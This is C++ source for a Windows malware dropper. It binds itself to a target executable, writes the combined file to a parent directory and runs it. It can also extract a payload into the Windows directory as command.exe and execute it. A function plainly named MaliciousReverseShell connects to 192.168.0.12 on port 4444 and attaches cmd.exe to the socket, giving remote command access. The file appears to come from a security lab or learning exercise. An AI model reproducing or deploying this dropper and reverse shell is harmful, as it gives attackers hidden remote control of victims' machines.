#include "dropper.h"

string GetDir()
{
	char buffer[MAX_PATH];
	GetModuleFileName(NULL, buffer, MAX_PATH);
	string::size_type pos = string(buffer).find_last_of("\\/");
	return string(buffer).substr(0, pos);
}

void ExecuteProcessNewThread(LPWSTR command)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOWDEFAULT;
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcess((LPCSTR)command, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
	{
		cout << "Failed to execute new binary (" << GetLastError() << ")" << endl;
		exit(-1);
	}

	// Wait till child handle is finished
	WaitForSingleObject(pi.hProcess, INFINITE);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void MaliciousReverseShell()
{
	WSADATA wsaData;
	SOCKET s1;
	struct sockaddr_in hax;
	STARTUPINFO sui;
	PROCESS_INFORMATION pi;

	WSAStartup(MAKEWORD(2, 2), &wsaData);
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	hax.sin_family = AF_INET;
	hax.sin_port = htons(4444); // port to make call back to
	hax.sin_addr.s_addr = inet_addr("192.168.0.12"); // ip to make callback to

	WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;

	std::cout << "[ ] Executing Reverse Shell" << std::endl;

	TCHAR commandLine[256] = "cmd.exe";
	// reverse shell that connects to IP
	CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi); 

	system("pause");
}

void write(int mysize, char *tpath, char *mybuf)
{
	char newpath[100] = "..\\..\\..\\..\\..\\output.exe"; // move out of original location
	int tsize = 0;
	ifstream tfile(tpath, ios::binary);

	tfile.seekg(0, ios::end);
	tsize = tfile.tellg();
	tfile.seekg(0, ios::beg);

	if (tsize < 1)
	{
		cout << "[-] Error with path provided";
		exit(-1);
	}

	char *tbuf = new char[tsize];
	tfile.read(tbuf, tsize);
	tfile.close();

	ofstream outputfile(newpath, ios::binary);
	outputfile.write(mybuf, mysize);
	cout << "[+] Writing " << mybuf << " with size of " << mysize << endl;
	outputfile.write(tbuf, tsize);
	cout << "[+] Writing " << tbuf << " with size of " << tsize << endl;

	outputfile.close();

	cout << "[+] Exe New Path: " << newpath << endl << endl;

	cout << "[+] Executing.." << endl;
	ExecuteProcessNewThread((LPWSTR)newpath);
}

void extract(int mysize, char *target)
{
	char mypath[100];
	char windir[250];
	GetWindowsDirectory(windir, MAX_PATH);

	ifstream tfile(target, ios::binary);
	tfile.seekg(5160);
	int theamount = mysize - 5160;
	char *tbuf = new char[theamount];

	tfile.read(tbuf, theamount);
	tfile.close();

	strncpy(mypath, windir, sizeof(windir));
	strcat(mypath, "\\command.exe");

	ofstream outfile(mypath, ios::binary);
	outfile.write(tbuf, theamount);
	outfile.close();

	cout << "[+] New Path: " << mypath << endl;

	ExecuteProcessNewThread((LPWSTR)mypath);
}

int checkit(int mysize, char *mybuf, char *target)
{
	int checker = 0;

	if (mysize != 81920)
	{
		cout << "[!] Size does not equal of target, extracting..." << endl;
		extract(mysize, target);
	}
	else {
		cout << "[+] Dropper Initiated" << endl;
		write(mysize, target, mybuf);
	}
	return 0;
}

void executeDropper(char *argv)
{
	long mysize;
	string dirName = GetDir();
	char *target = argv;
	ifstream myfile(argv, ios::binary);

	// find current file name
	TCHAR szFileName[MAX_PATH + 1];
	GetModuleFileName(NULL, szFileName, MAX_PATH + 1);

	myfile.seekg(0, ios::end);
	mysize = myfile.tellg();
	cout << "[+] File Size: " << mysize << endl;
	cout << "[+] Current Dir: " << dirName << endl;
	myfile.seekg(0, ios::beg);

	char *mybuf = new char[mysize];
	myfile.read(mybuf, mysize);
	myfile.close();

	// compare the last 10 characters, if it equals the new binary, then run
	if (_tcsncmp(strrchr(szFileName, '\0') - 10, "output.exe", 10) == 0)
	{
		MaliciousReverseShell();
		return;
	}
	else {
		// else, the file has been dropped yet
		if (checkit(mysize, mybuf, szFileName) == 0) {
			cout << "[+] Dropper finished" << endl;
		}
		else {
			cout << "[-] Something went wrong" << endl;
		}
	}

	return;
}